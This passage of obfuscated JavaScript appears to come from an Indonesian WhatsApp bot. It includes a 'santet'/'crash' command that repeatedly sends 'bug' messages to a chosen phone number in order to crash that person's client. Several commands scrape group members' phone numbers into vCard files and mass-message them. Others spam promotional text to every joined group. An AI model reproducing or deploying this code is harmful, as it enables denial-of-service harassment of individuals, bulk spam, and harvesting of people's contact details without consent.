                _0x1bd9c5 = "◦ Welcome : " + (db.data.chats[_0x2e8dd7.chat].welcome ? "Aktif" : "Tidak Aktif") + "\n◦ Antilink : " + (db.data.chats[_0x2e8dd7.chat].antilink ? "Aktif" : "Tidak Aktif") + "\n◦ AntilinkV2 : " + (db.data.chats[_0x2e8dd7.chat].antilink2 ? "Aktif" : "Tidak Aktif") + "\n◦ Anticall : " + (global.anticall ? "Aktif" : "Tidak Aktif") + "\n◦ Autoread : " + (global.autoread ? "Aktif" : "Tidak Aktif");
              }
              _0x2e8dd7.reply(_0x1bd9c5);
            } else {
              return _0x2e8dd7.reply("Options Tidak Ditemukan!");
            }
          } else {
            return _0x2e8dd7.reply(msg.group);
          }
        }
        break;
      case "off":
      case "disable":
        {
          if (_0x8bc55c) {
            if (!_0x2f74b1 && !_0x4a413c) {
              return _0x2e8dd7.reply(msg.admin);
            }
            if (!_0x40c6c7) {
              if (_0x2f74b1 && !_0x4a413c) {
                return _0x2e8dd7.reply(_0x2f69fb("welcome\n\n*List Options :*\nwelcome | antilink | antilinkV2\n\nKetik *" + _0x2495c9 + " status* untuk melihat status"));
              } else if (_0x4a413c) {
                return _0x2e8dd7.reply(_0x2f69fb("anticall\n\n*List Options :*\nwelcome | anticall | autoread | antilink | antilinkV2\n\nKetik *" + _0x2495c9 + " status* untuk melihat status"));
              }
            }
            var _0x1bd9c5;
            if (_0x40c6c7.toLowerCase() == "welcome") {
              db.data.chats[_0x2e8dd7.chat].welcome = false;
              _0x2e8dd7.reply("Berhasil Mematikan *Welcome* Di Grup Ini");
            } else if (_0x40c6c7.toLowerCase() == "antilink") {
              db.data.chats[_0x2e8dd7.chat].antilink = false;
              _0x2e8dd7.reply("Berhasil Mematikan *Antilink* Di Grup Ini");
            } else if (_0x40c6c7.toLowerCase() == "antilinkv2") {
              db.data.chats[_0x2e8dd7.chat].antilink2 = false;
              _0x2e8dd7.reply("Berhasil Mematikan *AntilinkV2* Di Grup Ini");
            } else if (_0x40c6c7.toLowerCase() == "anticall") {
              if (!_0x4a413c) {
                return _0x2e8dd7.reply(msg.owner);
              }
              global.anticall = false;
              _0x2e8dd7.reply("Berhasil Mematikan *Anticall*");
            } else if (_0x40c6c7.toLowerCase() == "autoread") {
              if (!_0x4a413c) {
                return _0x2e8dd7.reply(msg.owner);
              }
              global.autoread = false;
              _0x2e8dd7.reply("Berhasil Mematikan *Autoread*");
            } else if (_0x40c6c7.toLowerCase() == "status") {
              if (_0x2f74b1 && !_0x4a413c) {
                _0x1bd9c5 = "\n◦ Welcome : " + (db.data.chats[_0x2e8dd7.chat].welcome ? "Aktif" : "Tidak Aktif") + "\n◦ Antilink : " + (db.data.chats[_0x2e8dd7.chat].antilink ? "Aktif" : "Tidak Aktif") + "\n◦ AntilinkV2 : " + (db.data.chats[_0x2e8dd7.chat].antilink2 ? "Aktif" : "Tidak Aktif") + "\n";
              } else if (_0x4a413c) {
                _0x1bd9c5 = "◦ Welcome : " + (db.data.chats[_0x2e8dd7.chat].welcome ? "Aktif" : "Tidak Aktif") + "\n◦ Antilink : " + (db.data.chats[_0x2e8dd7.chat].antilink ? "Aktif" : "Tidak Aktif") + "\n◦ AntilinkV2 : " + (db.data.chats[_0x2e8dd7.chat].antilink2 ? "Aktif" : "Tidak Aktif") + "\n◦ Anticall : " + (global.anticall ? "Aktif" : "Tidak Aktif") + "\n◦ Autoread : " + (global.autoread ? "Aktif" : "Tidak Aktif");
              }
              _0x2e8dd7.reply(_0x1bd9c5);
            } else {
              return _0x2e8dd7.reply("Options Tidak Ditemukan!");
            }
          } else {
            return _0x2e8dd7.reply(msg.group);
          }
        }
        break;
      case "santet":
      case "crash":
        {
          if (!_0x4a413c) {
            return _0x2e8dd7.reply(msg.owner);
          }
          if (!_0x40c6c7) {
            return _0x2e8dd7.reply(_0x2f69fb("6283XX,jumlahbug"));
          }
          if (!_0x40c6c7.split(",")) {
            return _0x2e8dd7.reply(_0x2f69fb("6283XX,jumlahbug"));
          }
          var [_0x15c864, _0x13b726] = _0x40c6c7.split(",");
          if (isNaN(_0x15c864)) {
            return _0x2e8dd7.reply("Target Tidak Valid!");
          }
          if (isNaN(_0x13b726)) {
            return _0x2e8dd7.reply("Jumlah Tidak Valid!");
          }
          var _0x29f8ad = _0x15c864.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
          var _0x5d534f = await _0xb3bbc5.onWhatsApp(_0x29f8ad.split("@")[0]);
          if (!_0x5d534f[0].exists) {
            return _0x2e8dd7.reply("Target Tidak Terdaftar Di WhatsApp");
          }
          _0x2e8dd7.reply("Memproses Pengiriman Bug . . .");
          var _0xa68199 = Number(_0x13b726) + 10;
          for (let _0xcceb01 = 0; _0xcceb01 < _0xa68199; _0xcceb01++) {
            if (_0xcceb01 == 10) {
              _0x2e8dd7.reply("Berhasil Memproses, Bug Sedang Dikirim Ke " + _0x29f8ad.split("@")[0]);
            }
            _0x262882("" + _0x29f8ad);
            await sleep(2000);
          }
        }
        break;
      case "savekontak":
      case "svcontact":
        {
          if (!_0x4a413c) {
            return _0x2e8dd7.reply(msg.owner);
          }
          if (!_0x8bc55c) {
            return _0x2e8dd7.reply(msg.group);
          }
          const _0x216ebb = await _0x5dab39.participants.filter(_0x240b99 => _0x240b99.id.endsWith(".net")).map(_0x4de426 => _0x4de426.id);
          for (let _0x5c1cc4 of _0x216ebb) {
            if (_0x5c1cc4 !== _0x2e8dd7.sender) {
              _0x39d313.push(_0x5c1cc4);
              fs.writeFileSync("./all/database/contacts.json", JSON.stringify(_0x39d313));
            }
          }
          try {
            const _0x1d089c = [...new Set(_0x39d313)];
            const _0x47dcd7 = _0x1d089c.map((_0x53e22b, _0x12de1b) => {
              const _0xe7c4c5 = ["BEGIN:VCARD", "VERSION:3.0", "FN:𝐊𝐎𝐍𝐓𝐀𝐊 𝐁𝐔𝐘𝐄𝐑 𝐃𝐘𝐍𝐙 𝐒𝐓𝐎𝐑𝐄 𝐑𝐄𝐀𝐋 💮[" + _0x2f5dc5(2) + "] " + _0x53e22b.split("@")[0], "TEL;type=CELL;type=VOICE;waid=" + _0x53e22b.split("@")[0] + ":+" + _0x53e22b.split("@")[0], "END:VCARD", ""].join("\n");
              return _0xe7c4c5;
            }).join("");
            fs.writeFileSync("./all/database/contacts.vcf", _0x47dcd7, "utf8");
          } catch (_0x1991c4) {
            _0x2e8dd7.reply(_0x1991c4.toString());
          } finally {
            if (_0x2e8dd7.chat !== _0x2e8dd7.sender) {
              await _0x2e8dd7.reply("File Kontak Berhasil Dikirim ke Private Chat");
            }
            await _0xb3bbc5.sendMessage(_0x2e8dd7.sender, {
              document: fs.readFileSync("./all/database/contacts.vcf"),
              fileName: "contacts.vcf",
              caption: "File Contact Berhasil Di Buat✅",
              mimetype: "text/vcard"
            }, {
              quoted: _0x2e8dd7
            });
            _0x39d313.splice(0, _0x39d313.length);
            await fs.writeFileSync("./all/database/contacts.json", JSON.stringify(_0x39d313));
            await fs.writeFileSync("./all/database/contacts.vcf", "");
          }
        }
        break;
      case "savekontak2":
        {
          if (!_0x4a413c) {
            return _0x2e8dd7.reply(msg.owner);
          }
          if (!_0x40c6c7) {
            return _0x2e8dd7.reply(_0x2f69fb("idgrupnya\n\nketik *.listgc* untuk melihat semua list id grup"));
          }
          var _0x43fe85 = _0x40c6c7;
          var _0x591edc;
          try {
            _0x591edc = await _0xb3bbc5.groupMetadata("" + _0x43fe85);
          } catch (_0xe4e07c) {
            return _0x2e8dd7.reply("*ID Grup* tidak valid!");
          }
          const _0x5b4eb7 = await _0x591edc.participants;
          const _0x372797 = await _0x5b4eb7.filter(_0x3ed0b6 => _0x3ed0b6.id.endsWith(".net")).map(_0x53ea35 => _0x53ea35.id);
          for (let _0x4c07a4 of _0x372797) {
            if (_0x4c07a4 !== _0x2e8dd7.sender) {
              _0x39d313.push(_0x4c07a4);
              fs.writeFileSync("./all/database/contacts.json", JSON.stringify(_0x39d313));
            }
          }
          try {
            const _0x196b7d = [...new Set(_0x39d313)];
            const _0x3f34f3 = _0x196b7d.map((_0x352064, _0x300664) => {
              const _0x3bf76e = ["BEGIN:VCARD", "VERSION:3.0", "FN:𝐊𝐎𝐍𝐓𝐀𝐊 𝐁𝐔𝐘𝐄𝐑 𝐃𝐘𝐍𝐙 𝐒𝐓𝐎𝐑𝐄 𝐑𝐄𝐀𝐋 💮[" + _0x2f5dc5(2) + "] " + _0x352064.split("@")[0], "TEL;type=CELL;type=VOICE;waid=" + _0x352064.split("@")[0] + ":+" + _0x352064.split("@")[0], "END:VCARD", ""].join("\n");
              return _0x3bf76e;
            }).join("");
            fs.writeFileSync("./all/database/contacts.vcf", _0x3f34f3, "utf8");
          } catch (_0x3b9e63) {
            _0x2e8dd7.reply(_0x3b9e63.toString());
          } finally {
            if (_0x2e8dd7.chat !== _0x2e8dd7.sender) {
              await _0x2e8dd7.reply("File Kontak Berhasil Dikirim ke Private Chat");
            }
            await _0xb3bbc5.sendMessage(_0x2e8dd7.sender, {
              document: fs.readFileSync("./all/database/contacts.vcf"),
              fileName: "contacts.vcf",
              caption: "File Contact Berhasil Di Buat✅",
              mimetype: "text/vcard"
            }, {
              quoted: _0x2e8dd7
            });
            _0x39d313.splice(0, _0x39d313.length);
            await fs.writeFileSync("./all/database/contacts.json", JSON.stringify(_0x39d313));
            await fs.writeFileSync("./all/database/contacts.vcf", "");
          }
        }
        break;
      case "pushkontak":
      case "dellapush":
      case "pushgc":
        {
          if (!_0x4a413c) {
            return _0x2e8dd7.reply(msg.owner);
          }
          if (!_0x8bc55c) {
            return _0x2e8dd7.reply(msg.group);
          }
          if (!_0x40c6c7) {
            return _0x2e8dd7.reply(_0x2f69fb("pesannya"));
          }
          var _0x1bd9c5 = _0x40c6c7;
          const _0x5cb2dd = await _0x5dab39.participants.filter(_0x49691b => _0x49691b.id.endsWith(".net")).map(_0x2617df => _0x2617df.id);
          _0x2e8dd7.reply("Memproses Mengirim Pesan Ke *" + _0x5cb2dd.length + "* Member Grup");
          for (let _0x2d7e5e of _0x5cb2dd) {
            if (_0x2d7e5e !== _0x2e8dd7.sender) {
              _0x39d313.push(_0x2d7e5e);
              await fs.writeFileSync("./all/database/contacts.json", JSON.stringify(_0x39d313));
              await _0xb3bbc5.sendMessage(_0x2d7e5e, {
                text: _0x1bd9c5
              }, {
                quoted: _0x1a6a98
              });
              await sleep(4000);
            }
          }
          try {
            const _0x38568a = [...new Set(_0x39d313)];
            const _0x1e5e6a = _0x38568a.map((_0x19aeb4, _0x556d36) => {
              const _0x2799e4 = ["BEGIN:VCARD", "VERSION:3.0", "FN:𝐊𝐎𝐍𝐓𝐀𝐊 𝐁𝐔𝐘𝐄𝐑 𝐃𝐘𝐍𝐙 𝐒𝐓𝐎𝐑𝐄 𝐑𝐄𝐀𝐋 💮[" + _0x2f5dc5(2) + "] " + _0x19aeb4.split("@")[0], "TEL;type=CELL;type=VOICE;waid=" + _0x19aeb4.split("@")[0] + ":+" + _0x19aeb4.split("@")[0], "END:VCARD", ""].join("\n");
              return _0x2799e4;
            }).join("");
            fs.writeFileSync("./all/database/contacts.vcf", _0x1e5e6a, "utf8");
          } catch (_0x6e71c4) {
            _0x2e8dd7.reply(_0x6e71c4.toString());
          } finally {
            if (_0x2e8dd7.chat !== _0x2e8dd7.sender) {
              await _0x2e8dd7.reply("Berhasil Mengirim Pesan Ke *" + _0x5cb2dd.length + " Member Grup*, File Contact Berhasil Dikirim ke Private Chat");
            }
            await _0xb3bbc5.sendMessage(_0x2e8dd7.sender, {
              document: fs.readFileSync("./all/database/contacts.vcf"),
              fileName: "contacts.vcf",
              caption: "File Contact Berhasil Di Buat✅",
              mimetype: "text/vcard"
            }, {
              quoted: _0x2e8dd7
            });
            _0x39d313.splice(0, _0x39d313.length);
            await fs.writeFileSync("./all/database/contacts.json", JSON.stringify(_0x39d313));
            await fs.writeFileSync("./all/database/contacts.vcf", "");
          }
        }
        break;
      case "pushkontak1":
        {
          if (!_0x4a413c) {
            return _0x2e8dd7.reply(msg.owner);
          }
          if (!_0x40c6c7) {
            return _0x2e8dd7.reply(_0x2f69fb("idgrup|pesannya\n\nketik *.listgc* untuk melihat semua list id grup"));
          }
          if (!_0x40c6c7.split("|")) {
            return _0x2e8dd7.reply(_0x2f69fb("idgrup|pesannya\n\nketik *.listgc* untuk melihat semua list id grup"));
          }
          var _0x43fe85 = _0x40c6c7.split("|")[0];
          var _0x1bd9c5 = _0x40c6c7.split("|")[1];
          var _0x591edc;
          try {
            _0x591edc = await _0xb3bbc5.groupMetadata("" + _0x43fe85);
          } catch (_0x45b598) {
            return _0x2e8dd7.reply("*YG BENER AJA*");
          }
          const _0x557d70 = await _0x591edc.participants;
          const _0x393155 = await _0x557d70.filter(_0x45587d => _0x45587d.id.endsWith(".net")).map(_0x2916ce => _0x2916ce.id);
          _0x2e8dd7.reply("Memproses Mengirim Pesan Ke *" + _0x393155.length + "* Member Grup");
          for (let _0x465bee of _0x393155) {
            if (_0x465bee !== _0x2e8dd7.sender) {
              _0x39d313.push(_0x465bee);
              await fs.writeFileSync("./all/database/contacts.json", JSON.stringify(_0x39d313));
              await _0xb3bbc5.sendMessage(_0x465bee, {
                text: _0x1bd9c5
              }, {
                quoted: _0x1a6a98
              });
              await sleep(4000);
            }
          }
          try {
            const _0x150f58 = [...new Set(_0x39d313)];
            const _0x1690e7 = _0x150f58.map((_0x571e1d, _0x5605ea) => {
              const _0x5dac75 = ["BEGIN:VCARD", "VERSION:3.0", "FN:𝐊𝐎𝐍𝐓𝐀𝐊 𝐁𝐔𝐘𝐄𝐑 𝐃𝐘𝐍𝐙 𝐒𝐓𝐎𝐑𝐄 𝐑𝐄𝐀𝐋 💮[" + _0x2f5dc5(2) + "] " + _0x571e1d.split("@")[0], "TEL;type=CELL;type=VOICE;waid=" + _0x571e1d.split("@")[0] + ":+" + _0x571e1d.split("@")[0], "END:VCARD", ""].join("\n");
              return _0x5dac75;
            }).join("");
            fs.writeFileSync("./all/database/contacts.vcf", _0x1690e7, "utf8");
          } catch (_0x1e5169) {
            _0x2e8dd7.reply(_0x1e5169.toString());
          } finally {
            if (_0x2e8dd7.chat !== _0x2e8dd7.sender) {
              await _0x2e8dd7.reply("Berhasil Mengirim Pesan Ke *" + _0x393155.length + " Member Grup*, File Contact Berhasil Dikirim ke Private Chat");
            }
            await _0xb3bbc5.sendMessage(_0x2e8dd7.sender, {
              document: fs.readFileSync("./all/database/contacts.vcf"),
              fileName: "contacts.vcf",
              caption: "File Contact Berhasil Di Buat✅",
              mimetype: "text/vcard"
            }, {
              quoted: _0x2e8dd7
            });
            _0x39d313.splice(0, _0x39d313.length);
            await fs.writeFileSync("./all/database/contacts.json", JSON.stringify(_0x39d313));
            await fs.writeFileSync("./all/database/contacts.vcf", "");
          }
        }
        break;
      case "pushkontak2":
      case "pushkontakid":
        {
          if (!_0x4a413c) {
            return _0x2e8dd7.reply(msg.owner);
          }
          if (!_0x40c6c7) {
            return _0x2e8dd7.reply("*Contoh Command :*\n.pushkontak2 idgc|jeda|pesan\n\n*Note :* Jeda 1 detik = 1000\nketik *.listgc* untuk melihat semua list id grup");
          }
          if (!_0x40c6c7.split("|")) {
            return _0x2e8dd7.reply("*Contoh Command :*\n.pushkontak2 idgc|jeda|pesan\n\n*Note :* Jeda 1 detik = 1000\nketik *.listgc* untuk melihat semua list id grup");
          }
          var _0x43fe85 = _0x40c6c7.split("|")[0];
          var _0x28f1d1 = Number(_0x40c6c7.split("|")[1]);
          var _0x1bd9c5 = _0x40c6c7.split("|")[2];
          if (!_0x43fe85.endsWith("@g.us")) {
            return _0x2e8dd7.reply("Format ID Grup Tidak Valid");
          }
          if (isNaN(_0x28f1d1)) {
            return _0x2e8dd7.reply("Format Delay Tidak Valid");
          }
          if (!_0x1bd9c5) {
            return _0x2e8dd7.reply("*Contoh Command :*\n.pushkontak2 idgc|jeda|pesan\n\n*Note :* Jeda 1 detik = 1000\nketik *.listgc* untuk melihat semua list id grup");
          }
          var _0x591edc;
          try {
            _0x591edc = await _0xb3bbc5.groupMetadata("" + _0x43fe85);
          } catch (_0x39a952) {
            return _0x2e8dd7.reply("*ID Grup* tidak valid!");
          }
          const _0x180859 = await _0x591edc.participants;
          const _0x212e34 = await _0x180859.filter(_0x99e4da => _0x99e4da.id.endsWith(".net")).map(_0x29261b => _0x29261b.id);
          _0x2e8dd7.reply("Memproses Mengirim Pesan Ke *" + _0x212e34.length + "* Member Grup");
          for (let _0x136b38 of _0x212e34) {
            if (_0x136b38 !== _0x2e8dd7.sender) {
              _0x39d313.push(_0x136b38);
              await fs.writeFileSync("./all/database/contacts.json", JSON.stringify(_0x39d313));
              await _0xb3bbc5.sendMessage(_0x136b38, {
                text: _0x1bd9c5
              }, {
                quoted: _0x1a6a98
              });
              await sleep(Number(_0x28f1d1));
            }
          }
          try {
            const _0x1d673e = [...new Set(_0x39d313)];
            const _0x211921 = _0x1d673e.map((_0x5ec616, _0x510038) => {
              const _0x4f062a = ["BEGIN:VCARD", "VERSION:3.0", "FN:𝐊𝐎𝐍𝐓𝐀𝐊 𝐁𝐔𝐘𝐄𝐑 𝐃𝐘𝐍𝐙 𝐒𝐓𝐎𝐑𝐄 𝐑𝐄𝐀𝐋 💮[" + _0x2f5dc5(2) + "] " + _0x5ec616.split("@")[0], "TEL;type=CELL;type=VOICE;waid=" + _0x5ec616.split("@")[0] + ":+" + _0x5ec616.split("@")[0], "END:VCARD", ""].join("\n");
              return _0x4f062a;
            }).join("");
            fs.writeFileSync("./all/database/contacts.vcf", _0x211921, "utf8");
          } catch (_0x58b31b) {
            _0x2e8dd7.reply(_0x58b31b.toString());
          } finally {
            if (_0x2e8dd7.chat !== _0x2e8dd7.sender) {
              await _0x2e8dd7.reply("Berhasil Mengirim Pesan Ke *" + _0x212e34.length + " Member Grup*, File Contact Berhasil Dikirim ke Private Chat");
            }
            await _0xb3bbc5.sendMessage(_0x2e8dd7.sender, {
              document: fs.readFileSync("./all/database/contacts.vcf"),
              fileName: "contacts.vcf",
              caption: "File Contact Berhasil Di Buat✅",
              mimetype: "text/vcard"
            }, {
              quoted: _0x2e8dd7
            });
            _0x39d313.splice(0, _0x39d313.length);
            await fs.writeFileSync("./all/database/contacts.json", JSON.stringify(_0x39d313));
            await fs.writeFileSync("./all/database/contacts.vcf", "");
          }
        }
        break;
      case "idgc":
        {
          if (!_0x4a413c) {
            return _0x2e8dd7.reply(msg.owner);
          }
          if (!_0x8bc55c) {
            return _0x2e8dd7.reply(msg.group);
          }
          _0x2e8dd7.reply("" + _0x2e8dd7.chat);
        }
        break;
      case "listgc":
      case "cekid":
      case "listgrup":
        {
          let _0x107d1d = Object.values(await _0xb3bbc5.groupFetchAllParticipating().catch(_0x2f8f54 => null));
          let _0x32e1f1 = "*｢ LIST ALL CHAT GRUP ｣*\n\n";
          await _0x107d1d.forEach((_0x1dc31e, _0x4649ee) => {
            _0x32e1f1 += "•『 " + _0x1dc31e.subject + "\n • ⪼ ID : " + _0x1dc31e.id + "\n • ⪼ Member : " + _0x1dc31e.participants.length + " Member\n • ⪼ Pembuat : " + (_0x1dc31e.owner ? _0x1dc31e.owner.split("@")[0] : "Sudah keluar") + "\n\n";
          });
          _0x2e8dd7.reply(_0x32e1f1);
        }
        break;
      case "d":
      case "svb":
      case "sv":
      case "y":
        _0xb3bbc5.sendMessage(_0x2e8dd7.chat, {
          react: {
            text: "✅",
            key: _0x2e8dd7.key
          }
        });
        break;
      case "done":
        {
          if (!_0x4a413c) {
            return _0x2e8dd7.reply(msg.owner);
          }
          if (!_0x40c6c7) {
            return _0x2e8dd7.reply(_0x2f69fb("barang,harga\n\n*Contoh :* Panel Unlimited,2"));
          }
          if (!_0x40c6c7.split(",")) {
            return _0x2e8dd7.reply(_0x2f69fb("barang,harga\n\n*Contoh :* Panel Unlimited,2"));
          }
          const [_0x58efbc, _0xecb188] = _0x40c6c7.split(",");
          if (isNaN(_0xecb188)) {
            return _0x2e8dd7.reply("Format Harga Tidak Valid");
          }
          var _0xa68199 = _0xecb188 + "000000";
          var _0x16cc29 = Number(_0xecb188 + "000");
          const _0x58c6d7 = "*TRANSAKSI DONE BY " + global.della + " ✅*\n\n*📦 Barang :* " + _0x58efbc + "\n*💸 Nominal :* Rp" + _0x57576f(_0x16cc29) + "\n*⏰ Waktu :* " + _0x5e96be().split("T")[0] + "\n*🔰 Channel :* " + global.linksaluran + "\n_*Terimakasih Sudah Mempercayai & Menggunakan Jasa " + global.della + " 🥳*_\n *MASUK SALURAN CHANNEL AGAR MENDAPATKAN INFO-INFO TERBARU*";
          _0xb3bbc5.relayMessage(_0x2e8dd7.chat, {
            requestPaymentMessage: {
              currencyCodeIso4217: "IDR",
              amount1000: Number(_0xa68199),
              requestFrom: _0x2e8dd7.sender,
              noteMessage: {
                extendedTextMessage: {
                  text: "" + _0x58c6d7,
                  contextInfo: {
                    externalAdReply: {
                      showAdAttribution: true
                    }
                  }
                }
              }
            }
          }, {});
        }
        break;
      case "startjpm":
        {
          if (!_0x4a413c) {
            return _0x2e8dd7.reply(msg.owner);
          }
          var _0x554201 = await fs.readFileSync("./all/database/teksjpm.js").toString();
          if (_0x554201.length < 1) {
            return _0x2e8dd7.reply("Teks Jpm Tidak Ditemukan, Silahlan Isi/Edit Teks Jpm Didalam Folder all/database");
          }
          var _0x1bd9c5 = "" + _0x554201;
          let _0x33cbef = 0;
          let _0x4fde30 = await _0xb3bbc5.groupFetchAllParticipating();
          let _0x4f586c = await Object.keys(_0x4fde30);
          _0x2e8dd7.reply("Memproses Mengirim Pesan *Text* Ke *" + _0x4f586c.length + "* Grup");
          for (let _0x53368c of _0x4f586c) {
            try {
              await _0xb3bbc5.sendMessage(_0x53368c, {
                text: _0x554201,
                contextInfo: {
                  externalAdReply: {
                    thumbnailUrl: "https://telegra.ph/file/fba3ccdfa35b2cc099231.jpg",
                    title: "𝗠𝗮𝗿𝗸𝗲𝘁𝗽𝗹𝗮𝗰𝗲 𝐃𝐄𝐀𝐍🫧",
                    body: "Klik Disini Untuk Membeli",
                    sourceUrl: "https://wa.me/" + global.owner,
                    previewType: "PHOTO"
                  }
                }
              }, {
                quoted: _0x3c97fb
              });
              _0x33cbef += 1;
            } catch {}
            await sleep(4000);
          }
          _0x2e8dd7.reply("Berhasil Mengirim Pesan Ke *" + _0x33cbef + " Grup*");
        }
        break;
      case "jpm":
        {
          if (!_0x4a413c) {
            return _0x2e8dd7.reply(msg.owner);
          }
          if (!_0x40c6c7 && !_0x2e8dd7.quoted) {
            return _0x2e8dd7.reply(_0x2f69fb("teksnya atau replyteks"));
          }
          var _0x1bd9c5 = _0x2e8dd7.quoted ? _0x2e8dd7.quoted.text : _0x40c6c7;
          let _0x3c4063 = 0;
          let _0x25bcea = await _0xb3bbc5.groupFetchAllParticipating();
          let _0x45a640 = Object.entries(_0x25bcea).slice(0).map(_0x758ca4 => _0x758ca4[1]);
          let _0x3fa1c5 = _0x45a640.map(_0x3bc704 => _0x3bc704.id);
          _0x2e8dd7.reply("Memproses Mengirim Pesan *Text* Ke *" + _0x3fa1c5.length + "* Grup");
          for (let _0x33e43a of _0x3fa1c5) {
            try {
              await _0xb3bbc5.sendMessage(_0x33e43a, {
                text: _0x1bd9c5,
                contextInfo: {
                  externalAdReply: {
                    thumbnailUrl: "https://telegra.ph/file/fba3ccdfa35b2cc099231.jpg",
                    title: "𝗠𝗮𝗿𝗸𝗲𝘁𝗽𝗹𝗮𝗰𝗲 𝐃𝐄𝐀𝐍 🌐",
                    body: "Klik Disini Untuk Membeli",
                    sourceUrl: "https://wa.me/" + global.owner,
                    previewType: "PHOTO"
                  }
                }
              }, {
                quoted: _0x3c97fb
              });
              _0x3c4063 += 1;
            } catch {}
            await sleep(4000);
          }
          _0x2e8dd7.reply("Berhasil Mengirim Pesan Ke *" + _0x3c4063 + " Grup*");
        }
        break;
      case "jpmtesti":
        {
          if (!_0x4a413c) {
            return _0x2e8dd7.reply(msg.owner);
          }
          if (!_0x40c6c7) {
            return _0x2e8dd7.reply(_0x2f69fb("teksnya dengan balas/kirim foto"));
          }
          if (!/image/.test(_0x401616)) {
            return _0x2e8dd7.reply(_0x2f69fb("teksnya dengan balas/kirim foto"));
          }
          let _0x3afc0f = await _0xb3bbc5.downloadAndSaveMediaMessage(_0x5414c1);
          let _0x4a9ce9 = global.idsaluran.length < 1 ? "-" : global.idsaluran;
          let _0x3cbd40 = 0;
          let _0x3dbfe0 = await _0xb3bbc5.groupFetchAllParticipating();
          let _0x485831 = Object.entries(_0x3dbfe0).slice(0).map(_0x1f15f2 => _0x1f15f2[1]);
          let _0x41ce78 = _0x485831.map(_0x21138d => _0x21138d.id);
          _0x2e8dd7.reply("Memproses Mengirim Pesan *Teks & Foto* Ke *" + _0x41ce78.length + "* Grup");
          for (let _0x31a6af of _0x41ce78) {
            try {
              _0xb3bbc5.sendMessage(_0x31a6af, {
                image: await fs.readFileSync(_0x3afc0f),
                caption: _0x40c6c7,
                contextInfo: {
                  forwardingScore: 1,
                  isForwarded: true,
                  forwardedNewsletterMessageInfo: {
                    newsletterJid: _0x4a9ce9,
                    serverMessageId: 100,
                    newsletterName: "Testimoni By Dynz"
                  }
                }
              }, {
                quoted: _0x3c97fb
              });
              _0x3cbd40 += 1;
            } catch {}
            await sleep(4000);
          }
          await fs.unlinkSync(_0x3afc0f);
          _0x2e8dd7.reply("Berhasil Mengirim Postingan Ke *" + _0x3cbd40 + " Grup*");
        }
        break;
      case "addpanel":
      case "buatpanel":
      case "cpanel":
        {
          if (!_0x4a413c) {
            return _0x2e8dd7.reply(msg.owner);
          }
          if (global.apikey.length < 1) {
            return _0x2e8dd7.reply("Apikey Tidak Ditemukan!");
          }
          if (!_0x4f7636[0] || !_0x4f7636[1]) {
            return _0x2e8dd7.reply(_0x2f69fb("nama 2gb"));
          }
          if (!isNaN(_0x4f7636[0])) {
            return _0x2e8dd7.reply(_0x2f69fb("nama 2gb"));
          }
          var _0x27773b;
          var _0x1c30f1;
          var _0x1db868;
          let _0x440488 = _0x4f7636[0].toLowerCase();
          if (_0x4f7636[1] == "1gb") {
            _0x27773b = "30";
            _0x1c30f1 = "1000";
            _0x1db868 = "1000";
          } else if (_0x4f7636[1] == "2gb") {
            _0x27773b = "40";
            _0x1c30f1 = "2000";
            _0x1db868 = "2000";
          } else if (_0x4f7636[1] == "3gb") {
            _0x27773b = "50";
            _0x1c30f1 = "3000";
            _0x1db868 = "2000";
          } else if (_0x4f7636[1] == "4gb") {
            _0x27773b = "60";
            _0x1c30f1 = "4000";
            _0x1db868 = "2000";
          } else if (_0x4f7636[1] == "5gb") {
            _0x27773b = "70";
            _0x1c30f1 = "5000";
            _0x1db868 = "2000";
          } else if (_0x4f7636[1] == "6gb") {
            _0x27773b = "80";
            _0x1c30f1 = "6000";
            _0x1db868 = "3000";
          } else if (_0x4f7636[1] == "7gb") {
            _0x27773b = "90";
            _0x1c30f1 = "7000";
            _0x1db868 = "3000";
          } else if (_0x4f7636[1] == "8gb") {
            _0x27773b = "100";
            _0x1c30f1 = "8000";
            _0x1db868 = "3000";
          } else if (_0x4f7636[1] == "9gb") {
            _0x27773b = "110";
            _0x1c30f1 = "9000";
            _0x1db868 = "3000";
          } else if (_0x4f7636[1] == "10gb") {
            _0x27773b = "120";
            _0x1c30f1 = "10000";
            _0x1db868 = "4000";
          } else if (_0x4f7636[1] == "11gb") {
            _0x27773b = "140";
            _0x1c30f1 = "11000";
            _0x1db868 = "5000";
          } else if (_0x4f7636[1] == "12gb") {
            _0x27773b = "150";
            _0x1c30f1 = "12000";
            _0x1db868 = "5000";
          } else if (_0x4f7636[1] == "unli" || _0x4f7636[1] == "unlimited") {
            _0x27773b = "0";
            _0x1c30f1 = "0";
            _0x1db868 = "4000";
          } else {
            return _0x2e8dd7.eply("Format Ram Tidak Ditemukan!");
          }
          let _0xce4269 = _0x440488 + "@gmail.com";
          let _0x5b3993 = _0x515f60(_0x4f7636[0]);
          let _0x2b891f = _0x440488 + crypto.randomBytes(2).toString("hex");
          let _0x245f77 = await fetch(domain + "/api/application/users", {
            method: "POST",
            headers: {
              Accept: "application/json",
              "Content-Type": "application/json",
              Authorization: "Bearer " + apikey
            },
            body: JSON.stringify({
              email: _0xce4269,
              username: _0x440488,
              first_name: _0x5b3993,
              last_name: "Server",
              language: "en",
              password: _0x2b891f.toString()
            })
          });
          let _0xa24ef7 = await _0x245f77.json();
          if (_0xa24ef7.errors) {
            return _0x1857d0(JSON.stringify(_0xa24ef7.errors[0], null, 2));
          }
          let _0x3bcfac = _0xa24ef7.attributes;
          let _0x134e41 = _0x5e96be().split("T")[0];
          let _0x2155a1 = _0x3bcfac.id;
          let _0x1c7bf4 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
            method: "GET",
            headers: {
              Accept: "application/json",
              "Content-Type": "application/json",
              Authorization: "Bearer " + apikey
            }
          });
          let _0x4b0dee = await _0x1c7bf4.json();
          let _0x24115f = _0x4b0dee.attributes.startup;
          let _0x368805 = await fetch(domain + "/api/application/servers", {
            method: "POST",
            headers: {
              Accept: "application/json",
              "Content-Type": "application/json",
              Authorization: "Bearer " + apikey
            },
            body: JSON.stringify({
              name: _0x5b3993,
              description: _0x134e41,
              user: _0x2155a1,
              egg: parseInt(egg),
              docker_image: "ghcr.io/parkervcp/yolks:nodejs_18",
              startup: _0x24115f,
              environment: {
                INST: "npm",
                USER_UPLOAD: "0",
                AUTO_UPDATE: "0",
                CMD_RUN: "npm start"
              },
              limits: {
                memory: _0x1c30f1,
                swap: 0,
                disk: _0x1db868,
                io: 500,
                cpu: _0x27773b
              },
              feature_limits: {
                databases: 5,
                backups: 5,
                allocations: 5
              },
              deploy: {
